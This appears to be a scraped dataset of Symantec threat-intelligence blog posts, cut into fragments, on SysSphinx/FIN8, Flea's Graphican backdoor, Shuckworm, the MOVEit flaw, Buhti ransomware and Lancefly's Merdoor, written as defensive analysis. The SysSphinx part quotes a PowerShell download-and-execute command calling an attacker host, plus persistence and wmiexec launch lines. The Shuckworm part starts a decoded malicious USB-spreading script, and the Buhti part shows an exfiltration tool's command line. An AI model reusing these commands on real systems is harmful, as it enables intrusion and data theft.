reworkings look unnatural, suggesting that the primary goal of the threat actors could be to avoid similarities with previously disclosed details. for example, when sending messages over the network, the operation code specifying how to interpret the message has been moved after the variable part of the message, a change that adds some complications to the backdoor logic.this goal seemed limited to just the backdoor itself, as known syssphinx techniques were still used.\\xa0during the december 2022 incident, the attackers connected with psexec to execute the command “quser” in order to display the session details and then the following command to launch the backdoor:\\xa0powershell.exe -nop -ep bypass -c iex (new-object system.net.webclient).downloadstring(\\'https://37-10-71-215[.]nip[.]io:8443/7ea5fa\\')next, the attackers connected to the backdoor to check details of the affected computer before executing the command to establish persistence.\\xa0powershell -nop -ep bypass -c csidl_windows\\\\temp\\\\1.ps1 2bdf39983402c1e50e1d4b85766acf7athis resulted with a process similar to that described by

the attackers connected to the persistent backdoor, but paused after running a few basic commands. roughly 30 minutes later, the activity resumed with the attackers using what looked like wmiexec.py from impacket, which started a process to launch a new backdoor.cmd.exe /q /c powershell -nop -ep bypass -c csidl_system_drive\\\\shvnc.ps1 1> \\\\\\\\127.0.0.1\\\\admin$\\\\__1671129123.2520242 2>&1this new backdoor was used by the attackers for the next few hours.interestingly, the new backdoor powershell script uses a new file name and simplifies the command-line by removing the decryption key argument. switching the tools like this could indicate that the attackers are testing new features, so we were curious to analyze this new sample in detail.\\xa0one difference between the attack described by bitdefender and the recent attacks observed by symantec is the technique used to deploy the backdoor. in our case, the backdoor is embedded (indirectly) into a powershell script (see figure 1) used to infect target machines, while the variant documented by bitdefender features intermediate downloader shellcode that downloads and executes the backdoor.\\xa0the powershell script used by syssphinx can be seen in figure 2.the intention of the first line of code is to delete the powershell script file itself. the second line checks the architecture of the current process and picks the 32-bit or 64-bit version of the encoded .net loader as appropriate. the third line decodes the .net loader binary and loads it into the current process. finally, the fourth line of code starts the main functionality of the .net loader, where the injector and backdoor are decrypted and control is passed to the injector.the .net loader is an obfuscated .net dll. the obfuscation manifests certain confuserex features.\\xa0the .net loader contains two blobs, which it first decrypts with the rc4 algorithm using a hardcoded decryption key before decompressing. the decompressed blobs are then copied into a continuous chunk of memory. the .net loader then transfers control to the second blob (injector), passing the memory location and size of the first blob (backdoor) as parameters.the injector is in the form of shellcode and its entrypoint is shown in figure 3.the decrypt_dwords subroutine seen in figure 3 decrypts a few dwords (marked as encrypted_dwords in figure 3) to reveal a short chunk of code. the revealed code is shown in figure 4 and includes a decryption loop that looks similar to the “shellcode decryption routine” described in bitdefender’s report.\\xa0after the decryption loop completes execution, we can see the full logic of the entrypoint (figure 5).\\xa0the purpose of the injector is to start the backdoor in a newly created wmiprvse.exe process. when creating the wmiprvse.exe process, the injector attempts to start it in session-0 (best effort) using a token stolen from the lsass.exe process.\\xa0the backdoor is also in the form of shellcode and its entrypoint looks similar to that of the injector entrypoint, with the exception of polymorphism.interactive sessionsone of the interesting features of the backdoor is related to interactive sessions, where the attacker runs cmd.exe or other interactive processes on the affected computer. interestingly, the sample allows up to 10 such sessions to run at the same time. in addition, when starting each individual process, the attacker may use a process token stolen from a specified process id that is different for each session.\\xa0extensionsanother notable feature is that the backdoor supports three different formats to extend its functionality.\\xa0the first is with pe dll plugins that the backdoor loads within its own process and then calls:the second format supported by the backdoor is in the form of shellcode, where each shellcode plugin executes in its own dedicated process. before starting the shellcode, the backdoor creates a new process and writes into its memory the shellcode blob preceded by a simple structure storing a copy of arguments received from the remote attacker. it then uses the queueuserapc api to execute the shellcode, such that the address of the mentioned structure is passed as the first and only shellcode argument. to unload any shellcode plugin, the backdoor simply terminates the process associated with the specified plugin.\\xa0finally, the third format is also in the form of shellcode but with a different convention to pass the arguments. the backdoor executes this shellcode in the context of the backdoor\\'s main thread and no other commands are accepted until the shellcode returns. to execute the shellcode, the backdoor simply calls it as a subroutine passing four arguments, each providing the address of the corresponding argument received from the remote attacker (the backdoor appears to use 64-bit values when passing the addresses in case of 32-bit shellcode).\\xa0network communicationwhen communicating with its command-and-control (c&c) server, the backdoor exchanges messages of variable size using the structure shown in table 1.the size of body field (body_size) can be determined from the content of the header field as explained in the following sections.initial messageonce the backdoor connects to its c&c server, it sends the initial message of 0x10c bytes with:the body field of the initial message is 0x100 bytes and uses the structure shown in table 2.the size of rc4_key filed (rc4_key_size) is always 0x40 bytes.the snippet shown below roughly demonstrates the method used by

\\xa0mix(infection_id, infection_id_size, seed, seed_length);}other messagesfor all the communication that follows (incoming and outgoing), the backdoor uses the following method to determine the size of the body field (body_size):the content of body and footer fields is encrypted with the rc4 algorithm using rc4_key as the encryption key. the keystream is reused when encrypting each individual field.\\xa0the footer field is 8 bytes and, once decrypted, uses the structure shown in table 3.\\xa0finally, the structure of the decrypted body field varies depending on the message_type.\\xa0recognized commandsthe backdoor has the ability to receive and carry out the commands listed in table 4.syssphinx continues to develop and improve its capabilities and malware delivery infrastructure, periodically refining its tools and tactics to avoid detection. the group’s decision to expand from point-of-sale attacks to the deployment of ransomware demonstrates the threat actors’ dedication to maximizing profits from victim organizations. the tools and tactics detailed in this report serve to underscore how this highly skilled financial threat actor remains a

            "{'tite': 'Graphican: Flea Uses New Backdoor in Attacks Targeting Foreign Ministries', 'Explanation': 'the flea (aka apt15, nickel) advanced persistent threat (apt) group continued to focus on foreign ministries in a recent attack campaign that ran from late 2022 into early 2023 in which it leveraged a new backdoor called backdoor.graphican.this campaign was primarily focused on foreign affairs ministries in the americas, although the group also targeted a government finance department in a country in the americas and a corporation that sells products in central and south america. there was also one victim based in a european country, which was something of an outlier. this victim had also previously suffered a seemingly unrelated ransomware attack in july 2022. however, the primary focus of the campaign observed by the threat hunter team at symantec, part of broadcom, does appear to be on ministries of foreign affairs in the americas.flea has a track record of honing in on government targets, diplomatic missions, and embassies, likely for intelligence-gathering purposes.flea used a large number of tools in this campaign. as well as the new graphican backdoor, the attackers leveraged a variety of living-off-the-land tools, as well as tools that have been previously linked to flea. we will detail these tools in this section.graphican is an evolution of the known flea backdoor ketrican, which itself was based on a previous malware — bs2005 — also used by flea. graphican has the same basic functionality as ketrican, with the difference between them being graphican’s use of the microsoft graph api and onedrive to obtain its command-and-control (c&c) infrastructure.this technique was used in a similar way by the russian state-sponsored apt group swallowtail (aka apt28, fancy bear, sofacy, strontium) in a campaign in 2022 in which it delivered the graphite malware. in that campaign, the graphite malware used the microsoft graph api and onedrive as a c&c server.the observed graphican samples did not have a hardcoded c&c server, rather they connected to onedrive via the microsoft graph api to get the encrypted c&c server address from a child folder inside the \"person\" folder. the malware then decoded the folder name and used it as a c&c server for the malware. all instances of this variant used the same parameters to authenticate to the microsoft graph api. we can assume they all have the same c&c, which can be dynamically changed by the threat actors.once on a machine, graphican does the following:commands that can be executed by graphican include:during the course of this campaign, we also observed an updated version of ketrican, which had a hardcoded c&c server and only implemented the ‘c’, ‘u’, and ‘d’ commands. we also saw an older version of ketrican (compiled in 2020) that implemented only the ‘n’ and ‘p’ commands. this demonstrates that the group is actively developing and adapting ketrican to suit its objectives.other tools leveraged by flea in this recent activity include:flea has been in operation since at least 2004. over that time its tactics, techniques, and procedures (ttps), as well as its targeting, have changed and developed. in recent years, the group has primarily focused on attacks against government organizations, diplomatic entities, and non-governmental organizations (ngos) for the purposes of intelligence gathering. north and south america does appear to have become more of a focus for the group in recent times, which aligns with the targeting we saw in this campaign. the goal of the group does seem to be to gain persistent access to the networks of victims of interest for the purposes of intelligence gathering. its targets in this campaign, of ministries of foreign affairs, also point to a likely geo-political motive behind the campaign.flea traditionally used email as an initial infection vector, but there have also been reports of it exploiting public-facing applications, as well as using vpns, to gain initial access to victim networks.\\xa0microsoft seized domains belonging to flea in december 2021. the company seized 42 domains that it said were used in operations that targeted organizations in the u.s. and 28 other countries for intelligence-gathering purposes. flea was also linked in a november 2022 report by lookout to a long-running campaign targeting uyghur-language websites and social media in china.flea is believed to be a large and well-resourced group, and it appears that exposure of its activity, and even takedowns such as that detailed by microsoft, have failed to have a significant impact when it comes to stopping the group’s activity.the use of a new backdoor by flea shows that this group, despite its long years of operation, continues to actively develop new tools. the group has developed multiple custom tools over the years. the similarities in functionality between graphican and the known ketrican backdoor may indicate that the group is not very concerned about having activity attributed to it.the most noteworthy thing about graphican itself is the abuse of the microsoft graph api and onedrive to obtain its c&c server. the fact that a similar technique was used by swallowtail, an unconnected apt group operating out of a different region, is also worth noting. once a technique is used by one threat actor, we often see other groups follow suit, so it will be interesting to see if this technique is something we see being adopted more widely by other apt groups and cyber criminals.flea’s targets — foreign ministries — are also interesting; though they do align with the targets the group has directed its activity at in the past. it appears the flea’s interests remain similar to what they have been in recent years, even as its tools and techniques continue to evolve.for the latest protection updates, please visit the\\xa0symantec protection

            "{'tite': 'Shuckworm: Inside Russia’s Relentless Cyber Campaign Against Ukraine', 'Explanation': 'the shuckworm espionage group is continuing to mount multiple cyber attacks against ukraine, with recent targets including security services, military, and government organizations.in some cases, shuckworm has succeeded in staging long-running intrusions, lasting for as long as three months. the attackers repeatedly attempted to access and steal sensitive information such as reports about the deaths of ukrainian military service members, enemy engagements and air strikes, arsenal inventories, military training, and more.in a bid to stay ahead of detection, shuckworm has repeatedly refreshed its toolset, rolling out new versions of known tools and short-lived infrastructure, along with new additions, such as usb propagation malware.shuckworm (aka gamaredon, armageddon) is a russia-linked group that has almost exclusively focused its operations on ukraine since it first appeared in 2014. ukrainian officials have publicly stated that the group operates on behalf of the russian federal security service (fsb).shuckworm is known to use phishing emails as an initial infection vector, in order to gain access to victim machines and distribute malware. the attackers send emails with malicious attachments to ukrainian victims, with the attachments of various file types, such as:the victim lures we observed related to armed conflicts, criminal proceedings, combating crime, and protection of children, among others.once victims were infected, the attackers then proceed to download additional backdoors and tools onto targeted machines.shuckworm has also been observed using a new powershell script in order to spread its custom backdoor malware, pterodo, via usb. researchers from symantec, part of broadcom, blogged about backdoor.pterodo in april 2022, documenting how we had found four variants of the backdoor with similar functionality. the variants are visual basic script (vbs) droppers that will drop a vbscript file, use scheduled tasks (shtasks.exe) to maintain persistence, and download additional code from a command-and-control (c&c) server.examples of recent scheduled tasks include execution of the following command lines:the new powershell script is used to first copy itself onto the infected machine and create a shortcut file using an rtk.lnk extension. the script uses file names such as “porn_video.rtf.lnk”, “do_not_delete.rtf.lnk”” and “evidence.rtf.lnk” in an attempt to entice individuals to open the files. these file names are generally in ukrainian, but some are also in english.next, the script enumerates all drives, copying itself to any available removable disks – usb drives. these usb drives are likely used by the attackers for lateral movement across victim networks and may be used to help the attackers reach air-gapped machines within targeted organizations.in this recent activity, we also observed the group leveraging legitimate services to act as c&c servers, including using the telegram messaging service for its c&c infrastructure. more recently, they have also used telegram’s micro-blogging platform, called telegraph, to store c&c addresses.shuckworm tends to only use its c&c infrastructure for short periods of time, limiting the usefulness of its c&cs when it comes to finding more activity or linking activity together. however, the group does use ssl certificates that have some commonalities that may be leveraged for tracking purposes. we believe the group is likely leveraging pre-configured images for use in its c&c deployment. these data points can help researchers to identify additional c&c infrastructure and shuckworm activity.symantec also saw what was likely giddome, an infostealer tool that is a known shuckworm backdoor, deployed onto victim networks to steal and exfiltrate data of interest.the following describes a typical attack chain seen on a victim machine compromised by shuckworm in this campaign.in one attack, the first sign of malicious activity was when the user appeared to open a rar archive file that was likely delivered via a spear-phishing email and which contained a malicious document.after the document was opened, a malicious powershell command was observed being executed to download the next-stage payload from the attackers’ c&c server:more recently, symantec has observed shuckworm leveraging more ip addresses in their powershell scripts. this is likely an attempt to evade some tracking methods employed by researchers.shuckworm also continues to update the obfuscation techniques used in its powershell scripts in an attempt to avoid detection, with up to 25 new variants of the group’s scripts observed per month between january and april 2023.next, a vbs script, which was shuckworm’s pterodo backdoor, was executed:following this, we saw what appeared to be multiple similar scripts being executed. the machine used for this activity appeared to contain multiple confidential documents related to ukrainian security services or government departments.on a different machine, we saw malicious activity that appeared to be executed from a file (foto.safe) that had been dropped by an infected usb key that someone had plugged into the system. symantec observed multiple file paths present on infected machines that indicate users had plugged in an infected usb key e.g. \"usb-накопитель\" translates as \"usb-drive\".the foto.safe file is a base64-encoded script.decoded it looks like the following:function set-lnk ($child) {$nametxt = \"foto.safe\".tolower();$name = (\"компромат\", \"корзина\", \"секретно\" | get-random).toupper();$wshshell = new-object -comobject

itself onto the infected machine and then create a shortcut file that links to the powershell script. symantec has identified multiple variants of this script that can be used to indicate successful infection, or to download additional tools onto infected machines.\\xa0one of the most significant things about this campaign is the targets, which include ukrainian military, security, research, and government organizations. the attackers were observed focusing on machines that contained what appeared from file names to be sensitive military information that may be abused to support russian kinetic war efforts.\\xa0 \\xa0the majority of these attacks began in february/march 2023, with the attackers maintaining a presence on some of the victim machines until may. the sectors and nature of the organizations and machines targeted may have given the attackers access to significant amounts of sensitive information. there were indications in some organizations that the attackers were on the machines of the organizations’ human resources departments, indicating that information about individuals working at the various organizations was a priority for the attackers, among other things.this activity demonstrates that shuckworm’s relentless focus on ukraine continues. it seems clear that russian nation-state-backed attack groups continue to prioritize high-value ukrainian targets in attempts to find data that may potentially help their military operations.for the latest protection updates, please visit the symantec protection bulletin.malicious documentsusb propagation

            "{'tite': 'MOVEit Vulnerabilities: What You Need to Know', 'Explanation': 'extortion actors have been actively exploiting a recently patched vulnerability in moveit transfer, a file-transfer application that is widely used to transmit information between organizations. the nature of the software affected means that attackers can exploit unpatched systems to mount a supply chain attack against multiple organizations. while the original vulnerability (cve-2023-34362) was patched on may 31, moveit transfer’s developers announced on friday (june 9) that multiple additional vulnerabilities (cves pending) have also been identified and patched.prior to its patching, attackers linked to the clop ransomware operation were already exploiting cve-2023-34362 as a zero-day vulnerability. proof-of-concept code for the exploit is now publicly available, meaning other attackers are now likely to attempt to exploit unpatched systems.what is moveit transfer?moveit transfer is a managed file-transfer application developed by progress software. it is designed to permit secure transfer of files between businesses and their customers.what is the nature of the vulnerability?the original vulnerability (cve-2023-34362) occurs in the moveit transfer web application. it affected all versions prior to 2021.0.6 (13.0.6), 2021.1.4 (13.1.4), 2022.0.4 (14.0.4), 2022.1.5 (14.1.5), and 2023.0.1 (15.0.1). “[an] attacker may be able to infer information about the structure and contents of the database in addition to executing sql statements that alter or delete database elements,” progress said.for how long was the vulnerability being exploited before it was patched?according to a u.s. government advisory, active exploitation appears to have begun on may 27, 2023.how has the vulnerability been exploited to date?the vulnerability is being actively exploited by the clop ransomware operation. according to a joint advisory issued by the u.s. federal bureau of investigation (fbi) and the cybersecurity and infrastructure security agency (cisa), the attackers exploited the vulnerability to install a web shell called lemurloot (js.malscript!g1) on affected systems. this was then used to steal data from underlying databases.lemurloot was designed specifically to target the moveit transfer platform. it authenticates incoming https requests via a hard-coded password; runs commands that will download files from the moveit transfer database; extracts its azure system settings; retrieves records; and can create, insert, or delete a particular user. when responding to a request, lemurloot returns stolen data in a comfile format.shortly after the disclosure of the vulnerability, attackers linked to the clop ransomware operation claimed responsibility for the attack and said that they had stolen data from multiple moveit users and their customers. it threatened to release the stolen data unless a ransom is paid.what is known about clop?clop is an extortion and ransomware operation run by a cyber-crime group known as snakefly (aka ta505, fin11). while the group initially extorted victims by encrypting files using its own ransomware payload (ransom.clop), in recent times it has been known to eschew encryption entirely and rely on the threat of leaking stolen data to extort its victims.the group has a track record in exploiting zero-day vulnerabilities. in 2021, it was linked to the exploitation of multiple vulnerabilities in accellion fta, another file-transfer application. earlier this year it was responsible for exploiting a zero-day vulnerability (cve-2023-0669) in the goanywhere mft platform.how do symantec products guard against exploitation of this vulnerability?symantec products will guard against exploit attempts and payloads with the following detections:file-basedmachine learning-basednetwork-basedpolicy-baseddata center security (dcs) default hardening policies such as sym_win_hardened_sbp provide 0-day protection for cve-2023-34362. dcs policy control \"software install restrictions\" for ms sql, ms iis and other hardened application sandboxes stop clop ransomware from exploiting this vulnerability by preventing arbitrary deployment of webshells and unauthorized software.web-basedobserved domains/ips are covered under security categories.for the latest protection updates, please visit the symantec protection bulletin.the threat hunter team is a group of security experts within symantec whose mission is to investigate targeted attacks, drive enhanced protection in symantec products, and offer analysis that helps customers respond to attacks.we encourage you to share your thoughts on your favorite social platform.'}\n",
            "{'tite': 'Buhti: New Ransomware Operation Relies on Repurposed Payloads', 'Explanation': 'a relatively new ransomware operation calling itself buhti appears to be eschewing developing its own payload and is instead utilizing variants of the leaked lockbit and babuk ransomware families to attack windows and linux systems.while the group doesn’t develop its own ransomware, it does utilize what appears to be one custom-developed tool, an information stealer designed to search for and archive specified file types.buhti, which first came to public attention in february 2023, was initially reported to be attacking linux computers. however, symantec’s threat hunter team has also uncovered attempts to attack windows computers on compromised networks.the group appears to be quick to exploit recently disclosed vulnerabilities, with one recent attack exploiting the recently patched papercut vulnerability. since buhti hasn’t been linked to any known cyber-crime group, symantec has assigned the actor name blacktail to its operators.a recent buhti attack saw the attackers attempt to deploy a ransomware payload against windows computers on the targeted network. analysis of the payload revealed that it was a minimally modified version of the leaked lockbit 3.0 (aka lockbit black) ransomware. \\xa0encrypted files are appended with a .buthi extension. the ransom note can be seen in figure 1.the ransomware includes a feature that drops a lockbit-branded .bmp file (figure 2) and makes it the windows wallpaper, but this functionality was disabled by the attackers.the ransomware also has the capability to send system information about the infected computer to a command-and-control (c&c) server, but this functionality is also disabled and no c&c server is specified.lockbit 3.0 was developed for the syrphid cyber-crime group (aka bitwise spider), which is the operator of the lockbit ransomware. the builder for the ransomware was leaked in september 2022, allegedly by a disgruntled developer.while buhti came to public attention for targeting linux machines with a payload written in golang, analysis by symantec of multiple linux payloads found that they were all variants of the leaked babuk ransomware.babuk was one of the first ransomware actors to target esxi systems with a linux payload. babuk’s source code was leaked in 2021 and since then has been adopted and reused by multiple ransomware operations.the ransom note dropped by linux variants was identical to that of the windows payload; with only the payment address differing.blacktail does appear to use at least one piece of custom malware, a data-exfiltration tool (sha256: 9f0c35cc7aab2984d88490afdb515418306146ca72f49edbfbd85244e63cfabd).written in golang, it is designed to steal the following file types: .pdf, .php, .png, .ppt, .psd, .rar, .raw, .rtf, .sql, .svg, .swf, .tar, .txt, .wav, .wma, .wmv, .xls, .xml, .yml, .zip, .aiff, .aspx, .docx, .epub, .json, .mpeg, .pptx, .xlsx, .yaml. copied files are placed into a .zip archive, which is created using an open source utility called zip.the tool can be configured via command-line arguments to specify both the directory to search for files of interest in and the name of the output archive. the -o argument in the command line specifies the archive to be created. the -d argument specifies the directory to search for files of interest in. for example:csidl_windows\\\\temp\\\\xhfw.exe -o csidl_windows\\\\temp\\\\output.zip -d csidl_profilerecent buhti attacks exploited a recently discovered vulnerability in papercut ng and mf (cve-2023-27350). the exploit allows an attacker to bypass authentication and remotely execute code. the vulnerability was disclosed and patched by papercut on march 15, 2023, and in recent weeks multiple threat actors have begun utilizing the exploit against unpatched systems.the attackers exploited the vulnerability in order to install cobalt strike, meterpreter, sliver, anydesk, and connectwise. the tools were leveraged to steal data from, and deliver the ransomware payload to, multiple computers on the targeted network.blacktail appears quick to utilise new exploits. in february, they were reported to be exploiting a vulnerability in ibm’s aspera faspex file-exchange application (cve-2022-47986).while the reuse of leaked payloads is often the hallmark of a less-skilled ransomware operation, blacktail’s general competence in carrying out attacks, coupled with its ability to recognize the utility of newly discovered vulnerabilities, suggests that it is not to be underestimated.for the latest protection updates, please visit the symantec protection bulletin.if an ioc is malicious and the file available to us, symantec endpoint products will detect and block that file.063fcedd3089e3cea8a7e07665ae033ba765b51a6dc1e7f54dde66a79c67e1e7 - buhti (windows)eda0328bfd45d85f4db5dbb4340f38692175a063b7321b49b2c8ebae3ab2868c - buhti (linux)e5d65e826b5379ca47a371505678bca6071f2538f98b5fef9e33b45da9c06206 - buhti (linux)d65225dc56d8ff0ea2205829c21b5803fcb03dc57a7e9da5062cbd74e1a6b7d6 - buhti (linux)d259be8dc016d8a2d9b89dbd7106e22a1df2164d84f80986baba5e9a51ed4a65 - buhti (linux)8b5c261a2fdaf9637dada7472b1b5dd1d340a47a00fe7c39a79cf836ef77e441 - buhti (linux)898d57b312603f091ff1a28cb2514a05bd9f0eb55ace5d6158cc118d1e37070a - buhti (linux)515777b87d723ebd6ffd5b755d848bb7d7eb50fc85b038cf25d69ca7733bd855 - buhti (linux)4dc407b28474c0b90f0c5173de5c4f1082c827864f045c4571890d967eadd880 - buhti (linux)22e74756935a2720eadacf03dc8fe5e7579f354a6494734e2183095804ef19fe - buhti (linux)18a79c8a97dcfff57e4984aa7e74aa6ded22af8e485e807b34b7654d6cf69eef - buhti (linux)01b09b554c30675cc83d4b087b31f980ba14e9143d387954df484894115f82d4 - buhti (linux)7eabd3ba288284403a9e041a82478d4b6490bc4b333d839cc73fa665b211982c - buhti (linux)287c07d78cafc97fb4b7ef364a228b708d31e8fe8e9b144f7db7d986a1badd52 - buhti (linux)32e815ef045a0975be2372b85449b25bd7a7c5a497c3facc2b54bcffcbb0041c - cobalt strike beacon5b3627910fe135475e48fd9e0e89e5ad958d3d500a0b1b5917f592dc6503ee72 - cobalt strike beacond59df9c859ccd76c321d03702f0914debbadc036e168e677c57b9dcc16e980cb - cobalt strike beaconde052ce06fea7ae3d711654bc182d765a3f440d2630e700e642811c89491df72 - cobalt strike beacon65c91e22f5ce3133af93b69d8ce43de6b6ccac98fc8841fd485d74d30c2dbe7b - meterpreter8041b82b8d0a4b93327bc8f0b71672b0e8f300dc7849d78bb2d72e2e0f147334 - meterpreter8b2cf6af49fc3fb1f33e94ad02bd9e43c3c62ba2cfd25ff3dfc7a29dde2b20f2 - meterpreter97378d58815a1b87f07beefb24b40c5fb57f8cce649136ff57990b957aa9d56a – meterpreterc33e56318e574c97521d14d68d24b882ffb0ed65d96203970b482d8b2c332351 - meterpreter9b8adde838c8ea2479b444ed0bb8c53b7e01e7460934a6f2e797de58c3a6a8bf - possible meterpreter9f0c35cc7aab2984d88490afdb515418306146ca72f49edbfbd85244e63cfabd - exfiltration toolca6abfa37f92f45e1a69161f5686f719aaa95d82ad953d6201b0531fb07f0937 - possible exfiltration toolbdfac069017d9126b1ad661febfab7eb1b8e70af1186a93cb4aff93911183f24 - sliver91.215.85[.]18381.161.229[.]120the threat hunter team is a group of security experts within symantec whose mission is to investigate targeted attacks, drive enhanced protection in symantec products, and offer analysis that helps customers respond to attacks.we encourage you to share your thoughts on your favorite social platform.'}\n",
            "{'tite': 'Lancefly: Group Uses Custom Backdoor to Target Orgs in Government, Aviation, Other Sectors', 'Explanation': 'the lancefly advanced persistent threat (apt) group is using a custom-written backdoor in attacks targeting organizations in south and southeast asia, in activity that has been ongoing for several years.lancefly may have some links to previously known groups, but these are low confidence, which led researchers at symantec, by broadcom software, to classify this activity under a new group name.lancefly’s custom malware, which we have dubbed merdoor, is a powerful backdoor that appears to have existed since 2018. symantec researchers observed it being used in some activity in 2020 and 2021, as well as this more recent campaign, which continued into the first quarter of 2023. the motivation behind both these campaigns is believed to be intelligence gathering.the backdoor is used very selectively, appearing on just a handful of networks and a small number of machines over the years, with its use appearing to be highly targeted. the attackers in this campaign also have access to an updated version of the zxshell rootkit.the targets in this most recent activity, which began in mid-2022 and continued into 2023, are based in south and southeast asia, in sectors including government, aviation, education, and telecoms. symantec researchers previously saw the merdoor backdoor used in activity that targeted victims in the same geographies in the government, communications, and technology sectors in 2020 into 2021. like this recent activity, that activity also appeared to be highly targeted, with only a small number of machines infected.merdoor is a fully-featured backdoor that appears to have been in existence since 2018.the backdoor contains the following functionality:instances of the merdoor backdoor are usually identical with the exception of embedded and encrypted configuration, which determines:typically, the backdoor is injected into the legitimate processes perfhost.exe or svchost.exe.the merdoor dropper is a self-extracting rar (sfx) that contains three files:when opened, the dropper extracts embedded files and executes a legitimate binary in order to load the merdoor loader.merdoor dropper variants have been found that abuse older versions of five different legitimate applications for the purpose of dll sideloading:evidence from lancefly’s earlier campaign that began in 2020 suggested that in that instance the group may have used a phishing email with a lure based on the 37th asean summit as an initial infection vector.in this more recent activity, the initial infection vector was not entirely clear. we saw some indications of what the initial infection vector may have been in two victims, though this was not conclusive.while evidence for any of these infection vectors is not definitive, it does appear to indicate that lancefly is adaptable when it comes to the kind of infection vectors it uses.credential theft using non-malware techniquesin activity that also aligned with their earlier campaign in 2020/2021, the attackers used a number of non-malware techniques for credential theft on victim machines:the attackers also used a masqueraded version of the legitimate archiving tool winrar to stage and encrypt files before exfiltration.notable attack chain tools and ttpsa typical merdoor attack chain, as seen in one of the victims, appears to be:the zxshell rootkit was first reported on by cisco in 2014, but the version of the tool used by lancefly is updated, indicating that it continues to be actively developed. the source code of this rootkit is publicly available so it may be used by multiple different groups. the new version of the rootkit used by lancefly appears to be smaller in size, while it also has additional functions and targets additional antivirus software to disable.\\xa0loaderthe loader for the rootkit is a 32-bit dll with the export directory name \"formdll.dll\" (sha256: 1f09d177c99d429ae440393ac9835183d6fd1f1af596089cc01b68021e2e29a7).\\nit has the following exports:export \"loadsys\"whenever the export \"loadsys\" is executed, it drops one of the following files based on the processor architecture:these files are a malicious windows kernel driver. this is a variant of a driver that was first documented in an rsa blog several years ago.\\xa0it has the pdb filename: \"c:\\\\google\\\\objchk_win7_amd64\\\\amd64\\\\google.pdb\"the sample creates the device: \"\\\\device\\\\tdiproxy0\".it also creates the symbolic link \"\\\\dosdevices\\\\tdiproxy0\", so that it can be controlled using the pathname “\\\\\\\\.\\\\tdiproxy0”.after this, the loader timestamps the dropped file by copying the timestamps from the file \"[windowsdirectory]\\\\system32\\\\drivers\\\\http.sys\".then it creates a service with the following parameters:export \"calldriver\"\"calldriver\" opens the following device, which was created by the “\\\\\\\\.\\\\tdiproxy0” malicious kernel driver.it communicates with it using the deviceiocontrol api.the export expects two arguments. the first argument determines the dwiocontrolcode parameter to use when calling the deviceiocontrol api and it should be one of the following strings:any other values result in what looks like a buggy dwiocontrolcode value. the second argument is a string to pass as an lpinbuffer parameter when calling the deviceiocontrol api, after conversion using the multibytetowidechar api.export \"dorva\"whenever the export \"dorva\" is executed, it reads the following file:the file should start with the magic string \"ap32\" and contains shellcode to execute in compressed form.export \"killavpprocess\"this enumerates running processes and for selected processes and calls its own export \"calldriver\" with the following parameters:the export expects a single string parameter to compare with the executable file of running processes for

the merdoor loader, which is what indicates they are part of the same toolset.whenever the sample is executed, it attempts to read and delete the following file containing its configuration data:update functionalitynext, it checks that:if both checks pass, the sample attempts to tamper with various antivirus products using the \"\\\\\\\\.\\\\tdiproxy0\" device. for example, it may terminate the processes \"egui.exe\", \"ekrn.exe\", and \"msmpeng.exe\".next, it attempts to rename the file \"[file_directory_of_running_executable]\\\\res.dat\" as one of the following (depending on the windows version):based on the structure of the code, the above file should start with the magic string \"ap32\" and could contain a dll file in compressed form. the sample then decompresses the renamed file \"temp.temp\". when decompressing, it may create the temporary file \"temp.temp.pack\" in the same folder.next, the sample appends a certain marker followed by the content of \"[file_directory_of_running_executable]\\\\res.ini\" (partially transformed using the xor algorithm with the byte key 0x12) at the end of the decompressed file.additionally, it also creates the following registry value:then the sample checks if the following file exists:if so, the sample renames the updated \"temp.temp\" file to replace it.\\notherwise, it checks the following registry value for the pathname to replace:if that fails, it uses a default from configuration data.finally, it checks the following registry value for a service name:it restarts the referred service.installation

byte key 0x12) at the end of the decompressed file.additionally, it also creates the following registry value:finally, when the configuration data includes the option \"oneselfkey\", it makes a compressed copy of its own executable as (using aplib for compression):some samples include an embedded archive with the final payload:this is a variant of the zxshell backdoor (sha256: d5df686bb202279ab56295252650b2c7c24f350d1a87a8a699f6034a8c0dd849).the zxshell rootkit used by lancefly is signed by the certificate \"wemade entertainment co. ltd\", which was previously reported to be associated with apt41 (aka blackfly/grayfly). however, it is known that chinese apt groups, such as apt41, often share certificates with other apt groups. the zxshell backdoor has also previously been used by the hiddenlynx/apt17 group, but as the source code of zxshell is now publicly available this does not provide a definitive link between these two groups.also notable is that the zxshell rootkit loader component has the name \"formdll.dll\" and it has the ability to read the file \"form.hlp\" and execute its contents as shellcode. those same files were mentioned as being used in a previous report detailing activity by the iron tiger (aka budworm/apt27) group. in that case, the attackers used these filenames when loading the plugx backdoor onto victim machines. the prevalence of such files is very low, which may indicate a potential link between that campaign and this more recent activity.plugx is also seen being used by lancefly. plugx is a remote access trojan (rat) with multiple functionalities including backdoor access and data exfiltration. plugx has existed for well over a decade. it was originally used by chinese apt groups, but its use is now very widespread, meaning it is difficult to use it as a way of attributing activity.shadowpad is also used by these attackers. shadowpad is a modular rat believed to be exclusively used by chinese apt groups. its capabilities are similar to plugx, and it is often referred to as a successor to that malware.while these overlaps and shared tools may indicate some links between lancefly activity and activity by other apt groups, none of the overlaps are strong enough to attribute this activity and the development of the merdoor backdoor to an already-known attack group.this recent lancefly activity is of note due to its use of the merdoor backdoor, but also the low prevalence of this backdoor and the seemingly highly targeted nature of these attacks. while the merdoor backdoor appears to have been in existence for several years, it appears to only have been used in a small number of attacks in that time period. this prudent use of the tool may indicate a desire by lancefly to keep its activity under the radar.the tools used and sectors targeted all point to the motivations of this attack campaign being intelligence gathering. the similarities between this recent activity and earlier activity by lancefly indicate that the group perhaps did not realize the earlier activity had been discovered, so it was not concerned about links being made between the two. whether or not the exposure of this activity will lead to any alteration in how the group carries out its activity remains to be seen.\\xa0for the latest protection updates, please visit the symantec protection

